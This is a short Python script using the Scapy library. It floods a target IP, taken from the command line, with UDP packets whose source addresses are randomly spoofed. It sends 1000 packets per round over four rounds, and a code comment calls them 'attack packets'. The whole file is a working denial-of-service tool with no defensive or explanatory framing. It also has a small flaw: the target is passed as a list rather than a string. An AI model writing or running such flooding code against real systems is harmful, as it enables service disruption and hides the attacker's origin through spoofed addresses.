import sys
import time
from os import popen
import logging


from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from random import randrange
import time

def sourceIPgen():
    not_valid = [10,127,254,255,1,2,169,172,192]
    first = randrange(1,256)

    while first in not_valid:
      first = randrange(1,256)
    ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])

    return ip

def main():
  for i in range (1,5):
    mymain()
    time.sleep (10)

def mymain():
  #getting the ip address to send attack packets 
  dstIP = sys.argv[1:]
  src_port = 80
  dst_port = 1

  # open interface eth0 to send packets
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  for i in xrange(0,1000):
    # form the packet
    packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)

    # send packet with the defined interval (seconds) 
    sendp( packets,iface=interface.rstrip(),inter=0.025)

if __name__=="__main__":
  main()

